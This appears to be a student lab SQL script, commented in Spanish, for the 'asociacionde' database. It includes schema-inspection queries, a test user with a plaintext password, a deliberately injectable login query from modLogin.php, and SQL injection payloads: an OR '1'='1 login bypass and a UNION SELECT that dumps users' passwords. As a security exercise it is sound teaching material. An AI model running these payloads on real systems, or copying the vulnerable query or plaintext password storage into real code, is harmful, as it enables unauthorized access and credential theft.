
-- 1. Consultas con INFORMATION_SCHEMA

-- Consulta 1: Mostrar todas las tablas de la base de datos
-- Muestra el nombre y tipo de cada tabla del sistema
SELECT TABLE_NAME, TABLE_TYPE 
FROM INFORMATION_SCHEMA.TABLES 
WHERE TABLE_SCHEMA = DATABASE();

-- Consulta 2: Obtener estructura completa de la tabla usuario
-- Incluye nombre de columna, tipo de dato, si permite NULL y valor por defecto
SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE, COLUMN_DEFAULT 
FROM INFORMATION_SCHEMA.COLUMNS 
WHERE TABLE_NAME = 'usuario' 
  AND TABLE_SCHEMA = 'asociacionde' 
ORDER BY ORDINAL_POSITION;

-- Consulta 3: Obtener información sobre claves PK Y FK
SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, 
       REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME 
FROM INFORMATION_SCHEMA.KEY_COLUMN_USAGE 
WHERE TABLE_SCHEMA = 'asociacionde' 
  AND TABLE_NAME = 'usuario';
  
-- Consulta 4: Obtener información sobre índices de la tabla
-- Muestra qué columnas están "indexadas" y si el índice es único
SELECT INDEX_NAME, COLUMN_NAME, NON_UNIQUE 
FROM INFORMATION_SCHEMA.STATISTICS 
WHERE TABLE_SCHEMA = 'asociacionde' 
  AND TABLE_NAME = 'usuario';
  

-- 2. Insertar usuario de prueba (sin hash)

-- Insertar usuario con contraseña para pruebas de inyección
INSERT INTO usuario (nombre, correo, contrasenia, permiso, fecha_registro, visitas) 
VALUES ('prueba', 'test@test.com', 'password123', 'U', NOW(), 0);

-- 3. Función vulnerable de validación de usuario

-- Código PHP del archivo modLogin.php
SELECT * FROM usuario 
WHERE correo = '$correo' 
  AND contrasenia = '$pwd';
  
-- Código PHP para actualizar visitas
UPDATE usuario 
SET visitas = visitas + 1 
WHERE idUsuario = $idUsuario;

-- 4. Ejemplos de inyecciones SQL probadas

-- test@test.com' OR '1'='1
SELECT * FROM usuario 
WHERE correo = 'test@test.com' OR '1'='1' 
  AND contrasenia = 'password123';
  
-- ' UNION SELECT idUsuario, nombre, contrasenia, permiso, correo, fecha_registro, visitas FROM usuario --
SELECT * FROM usuario 
WHERE correo = '' 
UNION 
SELECT idUsuario, nombre, contrasenia, permiso, correo, fecha_registro, visitas 
FROM usuario 

-- ' AND contrasenia = 'test'
